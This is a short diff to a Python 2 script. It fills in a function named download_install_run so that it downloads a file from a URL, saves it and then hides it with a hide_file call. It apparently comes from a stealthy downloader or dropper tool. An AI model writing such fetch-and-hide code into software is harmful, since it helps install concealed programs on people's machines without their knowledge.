@@ -61,7 +61,10 @@ def download_install_run(url, specialpath, fname):
     #Save the file
     u = urllib2.urlopen(url)
     f = open(path, "wb")
-    
+    f.write(u.read())
+    f.close()
+    u.close()
+    hide_file(f)
         
 #Utility functions.  May be useful elsewhere
 def file_in_special_path(specialpath, fname):
